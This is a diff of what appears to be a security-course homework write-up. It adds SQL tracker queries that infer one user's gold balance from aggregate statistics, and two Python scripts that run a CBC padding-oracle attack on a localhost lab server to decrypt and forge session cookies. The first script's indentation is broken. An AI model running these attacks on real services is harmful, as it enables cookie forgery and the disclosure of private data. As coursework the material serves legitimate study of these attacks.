@@ -58,10 +58,10 @@ will fall between $k$ to $N-k$ since  $\frac{1}{8} < \frac{1}{2} < 1-\frac{1}{8}
 
 **Three queries:**
 ``` 
-  q( C or T )    = SELECT SUM(Gold) FROM Players where Server = PVE or Username = XdarksephirothX
-  q( C or not T) = SELECT SUM(Gold) FROM Players where Server = PVP or Username = XdarksephirothX
+  q( C or T )    = SELECT SUM(Gold) FROM Players where Server = "PVE" or Username = "XdarksephirothX"
+  q( C or not T) = SELECT SUM(Gold) FROM Players where Server = "PVP" or Username = "XdarksephirothX"
   q( S )         = SELECT SUM(Gold) FROM Players
-  XdarksephirothX's gold =  q( C or T ) +q( C or not T) + q( S ) 
+  XdarksephirothX's gold =  q( C or T ) +q( C or not T) - q( S ) 
 ```
 
 ## 
@@ -69,14 +69,12 @@ tracker and assumption: same as 2.1
 
 **Three queries:**
 ``` 
-  q( C or T )    = SELECT COUNT(*) FROM Players where Server = PVE or Username = XdarksephirothX
-  q( C or not T) = SELECT COUNT(*) FROM Players where Server = PVP or Username = XdarksephirothX
-  q( S )         = SELECT COUNT(*) FROM Players
-  XdarksephirothX's gold =  q( C or T ) +q( C or not T) + q( S ) 
+ q( C or T )    = SELECT COUNT(*) FROM Players where (Server=PVE or Username=doomlaser) and Gold>10 billion
+ q( C or not T) = SELECT COUNT(*) FROM Players where (Server=PVP or Username=doomlaser) and Gold>10 billion
+ q( S )         = SELECT COUNT(*) FROM Players where Gold > 10 billion
 ```
-
-
-
+so by doing  $q( C or T ) +q( C or not T) - q( S )$  we actually only query for doomlaser and ask "whether doomlaser's gold is more than 10 billion or not?"
+if result is 1 then means yes, if 0 then means no. So we just need to take 20 billion/2 as midddle point and query $\log_2 20$billion times to apply binary search in order to find result. 
 
 # Question 3
 ## 
@@ -135,9 +133,251 @@ The attorneys allege that according to a memo released by prosecutors, that pros
 
 
 
+# Question 4
+## 
+
+**average case** =   bytes in block $*$ number of block(N)$*$ different combination per byte /2 
+                   = 256$*$16/2$*$N=2048N
+
+**worst case** =   bytes in block $*$ number of block(N)$*$ different combination per byte 
+= 256$*$16$*$N=4096N
+
+## 
 
 
 
+## 
+
+
+
+## 
+```python
+    #!/usr/bin/env python
+  import urllib
+  import urllib2
+  import base64
+  import sys
+  
+  SIZE_OF_BLOCK=16       # AES is 128 bits = 16 bytes
+  
+  # check whether a particular hit may be match multiple padding
+  def check(byte,IVguess,blk):
+    inidicator = -1
+    for x in range(0, 15):
+      old = IVguess[x]
+      IVguess[x] = IVguess[x] ^ 1
+      header = {"Cookie" : 'user="' + (base64.b64encode(''.join(map(chr,IVguess)) + blk)) + '"'}
+      my_request = urllib2.Request("http://localhost:4555", None, header)
+      try:
+        my_response = urllib2.urlopen(my_request)
+      except urllib2.HTTPError as e:
+        IVguess[x] = old
+        inidicator = x
+        return inidicator
+      else:
+        IVguess[x] = old
+    return inidicator
+  
+  # send request to server 
+  def send_padding_request(byte,IVguess,blk):
+    #print ('ddd')
+    for x in range(0, 256): 
+      IVguess[byte] = x
+      header = {"Cookie" : 'user="' + (base64.b64encode(''.join(map(chr,IVguess)) + blk)) + '"'}
+      my_request = urllib2.Request("http://localhost:4555", None, header)
+      try:
+        my_response = urllib2.urlopen(my_request)
+      except urllib2.HTTPError as e:
+        pass
+      else:
+        break
+  
+  def decrypt(Cookie):
+      # decode first,  if not fit length, terminate
+      try:
+        cookie_block = base64.standard_b64decode(Cookie)
+      except TypeError:
+        print("sorry, length is not in requirement, terminate")
+        return
+      else:
+        # divide to chunks
+        cookie_block = list((cookie_block[0+k : SIZE_OF_BLOCK+k] for k in range(0, len(cookie_block), SIZE_OF_BLOCK)))
+        previous_real_IV = cookie_block[0]
+  
+        plaintexts = ''
+        counter=0
+        
+        # for each block
+        for block in cookie_block[1:]:
+        #setup
+            IVguess = [0]*SIZE_OF_BLOCK
+            intermediate_state = [0]*SIZE_OF_BLOCK
+            plaintext = [0]*SIZE_OF_BLOCK
+            previous_real_IV = map (ord,cookie_block[counter])
+            counter = counter +  1
+  
+            for byte in range(SIZE_OF_BLOCK-1, -1, -1):
+  
+                padding = [0] * SIZE_OF_BLOCK
+                # send request 
+                send_padding_request(byte,IVguess,block)
+  
+                # once we break we have a working byte
+                padding_num = (SIZE_OF_BLOCK-1) - (byte - 1)
+  
+                # caculate intermedinate byte
+                if padding_num == 1:
+            inidicator = check(byte,IVguess,block)
+            if inidicator != -1:
+              intermediate_state[byte] = IVguess[byte] ^ (SIZE_OF_BLOCK - inidicator)
+            else:
+              intermediate_state[byte] = IVguess[byte] ^ 1
+                else:
+                    intermediate_state[byte] = IVguess[byte] ^ (padding_num - 1)
+  
+                # calulate plain text
+                plaintext[byte] = intermediate_state[byte]^previous_real_IV[byte] 
+  
+                # get padding so we can adjust IVguess for next byte decryption
+                for x in range (byte, SIZE_OF_BLOCK):  # 14: 14 15
+                    if x == SIZE_OF_BLOCK-1:  # 15
+                        padding[x] = padding_num+1  # 2
+                    else: 
+                        padding[x] = 15 - x 
+  
+                # adjust IVguess
+                for k in range (byte, SIZE_OF_BLOCK):
+                    IVguess[k] = intermediate_state[k] ^ padding[k]
+  
+            plaintexts= plaintexts + (''.join(map(chr,plaintext)))
+  
+        print(plaintexts)
+  
+  
+  def start():
+      if len(sys.argv) != 2:
+          print('Usage: ./encrypt <Cookie String>')
+          sys.exit(1)
+      text = sys.argv[1]
+      decrypt(text)
+  
+  if __name__ == "__main__":
+      start()
+
+  
+  
+  
+```
+
+
+
+## 
+```python
+  #!/usr/bin/env python
+import urllib
+import urllib2
+import base64
+import sys
+
+SIZE_OF_BLOCK=16    
+
+# send request to server 
+def send_padding_request(byte,IVguess,blk):
+    for x in range(0, 256):
+        IVguess[byte] = x
+        header = {"Cookie" : 'user="' + (base64.b64encode(''.join(map(chr,IVguess)) + blk)) + '"'}
+        my_request = urllib2.Request("http://localhost:4555", None, header)
+        try:
+            my_response = urllib2.urlopen(my_request)
+        except urllib2.HTTPError as e:
+            pass
+        else:
+            return
+
+def encrypt(Word):
+
+    word_to_use = list((Word[0+k : SIZE_OF_BLOCK+k] for k in range(0, len(Word), SIZE_OF_BLOCK)))
+
+    #fisrt_randomly select a block of encrypt text to initialze encryption
+    next_block= '\xf6\x1aJk\x00\xcf\xd1d"\x9d\xa2\x90\x0bi*\x1c'
+
+    encryptedtexts = next_block
+
+    # checking end padding of the last block 
+    end_padding=''
+    length_of_last=len(word_to_use[-1])
+    if (length_of_last != SIZE_OF_BLOCK):
+        for x in range(length_of_last, SIZE_OF_BLOCK-1):
+            word_to_use[-1] += chr(SIZE_OF_BLOCK- x - 1)
+        word_to_use[-1] += chr(SIZE_OF_BLOCK-length_of_last)
+    else:
+        for x in range(0,SIZE_OF_BLOCK-1):
+            end_padding += chr(15-x)
+        end_padding += chr(16)
+        word_to_use.append(end_padding)
+    
+
+    # for each block
+    for block in reversed(word_to_use):
+        
+        IVguess = [0]*SIZE_OF_BLOCK
+        intermediate_state = [0]*SIZE_OF_BLOCK
+        plaintext = map (ord,block)
+        encryptedtext = [0]*SIZE_OF_BLOCK
+
+
+        for byte in range(SIZE_OF_BLOCK-1, -1, -1):
+
+            padding = [0] * SIZE_OF_BLOCK
+
+            # send request 
+            
+            send_padding_request(byte,IVguess,next_block)
+
+            # once we break we have a working byte
+            padding_num = (SIZE_OF_BLOCK-1) - (byte - 1)
+
+            # calculate intermediate_state byte by byte
+            if padding_num == 1:
+                intermediate_state[byte] = IVguess[byte] ^ 1
+            else:
+                intermediate_state[byte] = IVguess[byte] ^ (padding_num - 1)
+
+            # we have plain text and intermediate state so we can calulate plain text
+            encryptedtext[byte] = intermediate_state[byte]^plaintext[byte]
+
+            # get padding so we can adjust IVguess for next byte decryption
+            for x in range (byte, SIZE_OF_BLOCK):  # 14: 14 15
+                if x == SIZE_OF_BLOCK-1:  # 15
+                    padding[x] = padding_num+1  # 2
+                else: 
+                    padding[x] = 15 - x 
+
+            # adjust IVguess
+            for k in range (byte, SIZE_OF_BLOCK):
+                IVguess[k] = intermediate_state[k] ^ padding[k]
+
+        #updata previous block as newly encrypted block 
+        next_block=  (''.join(map(chr,encryptedtext)))
+        encryptedtexts =(''.join(map(chr,encryptedtext)))+encryptedtexts
+
+    print(base64.b64encode(encryptedtexts))
+
+
+
+def start():
+    if len(sys.argv) != 2:
+        print('Usage: ./encrypt <Cookie String>')
+        sys.exit(1)
+    word = sys.argv[1]
+    encrypt(word)
+
+if __name__ == "__main__":
+    start()
+
+  
+  
+```
 
 
 
